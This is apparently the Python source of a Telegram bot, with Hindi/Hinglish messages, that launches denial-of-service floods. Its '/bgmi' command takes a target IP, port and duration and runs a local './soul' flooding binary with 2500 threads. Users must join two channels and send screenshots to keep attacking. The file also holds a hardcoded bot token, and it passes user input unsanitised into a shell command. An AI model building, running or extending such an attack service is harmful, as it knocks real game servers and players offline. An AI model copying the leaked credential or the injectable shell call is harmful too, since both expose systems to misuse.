import telebot
import datetime
import time
import subprocess
import threading

# ✅  TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8064557178:AAG578KnVSWvoz5eigBuQQwVTfYuLi5LPTU')

# ✅  GROUP & CHANNEL SETTINGS
GROUP_ID = "-1001855389923"
SCREENSHOT_CHANNEL = "@CLouD_VIP_CHEAT"
SCREENSHOT_CHANNEL_2 = "@KHAPITAR_BALAK77"
ADMINS = [7129010361, 1851260327]

# ✅ GLOBAL VARIABLES
active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
pending_verification = {}  # वेरिफिकेशन के लिए यूजर्स लिस्ट
user_attack_count = {}
MAX_ATTACKS = 3  # (या जो भी लिमिट चाहिए)

# ✅ CHECK IF USER IS IN BOTH CHANNELS
def is_user_in_both_channels(user_id):
    try:
        member1 = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        member2 = bot.get_chat_member(SCREENSHOT_CHANNEL_2, user_id)
        return (member1.status in ['member', 'administrator', 'creator']) and (member2.status in ['member', 'administrator', 'creator'])
    except:
        return False

# ✅ HANDLE ATTACK COMMAND (FIXED)
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❗ **PEHLE DONO CHANNEL JOIN KARO!**\n👉 {SCREENSHOT_CHANNEL}\n👉 {SCREENSHOT_CHANNEL_2}")
        return

    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
    if user_id in pending_verification:
        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
        return

    # ✅ अटैक लिमिट चेक करो
    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
    if user_active_attacks >= MAX_ATTACKS:
        bot.reply_to(message, f"⚠️ **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\n👉 **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE:** `/bgmi <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **180S SE ZYADA ALLOWED NAHI HAI!**")
        return

    # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
    pending_verification[user_id] = True

    bot.send_message(
        message.chat.id,
        f"📸 **TURANT SCREENSHOT BHEJ!**\n"
        f"⚠️ **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
        parse_mode="Markdown"
    )

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"🔥 **ATTACK DETAILS** 🔥\n\n"
        f"👤 **USER:** `{user_id}`\n"
        f"🎯 **TARGET:** `{target}`\n"
        f"📍 **PORT:** `{port}`\n"
        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
        f"📸 **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
        f"⚠️ **ATTACK CHALU HAI! /check KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # ✅ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "✅ **ATTACK KHATAM HO GAYA!** 🎯",
                parse_mode="Markdown"
            )
            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर

    threading.Thread(target=attack_execution).start()

# ✅ SCREENSHOT VERIFICATION SYSTEM (FIXED)
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in pending_verification:
        bot.reply_to(message, "❌ **TERE KOI PENDING VERIFICATION NAHI HAI! SCREENSHOT FALTU NA BHEJ!**")
        return

    # ✅ SCREENSHOT BOTH CHANNELS FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")
    bot.send_photo(SCREENSHOT_CHANNEL_2, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
    bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

# ✅ /ANNOUNCE Command (Admin Only)
@bot.message_handler(commands=['announce'])
def announce_message(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /announce <message>")
        return

    announcement = f"📢 **ANNOUNCEMENT:**\n{command[1]}"
    
    # ✅ Auto-Pin Announcement
    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
    bot.pin_chat_message(GROUP_ID, msg.message_id)

    # ✅ Auto-Delete After 2 Hours (7200 seconds)
    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()

    bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")

# ✅ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        if active_attacks[user][2] <= now:
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "📊 **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ❌")
        return

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
    for user, (target, port, end_time) in active_attacks.items():
        remaining_time = (end_time - now).total_seconds()
        stats_message += (
            f"👤 **USER ID:** `{user}`\n"
            f"🎯 **TARGET:** `{target}`\n"
            f"📍 **PORT:** `{port}`\n"
            f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
            f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ✅ BOT START
bot.polling(none_stop=True)

# ✅ START POLLING
bot.polling(none_stop=True)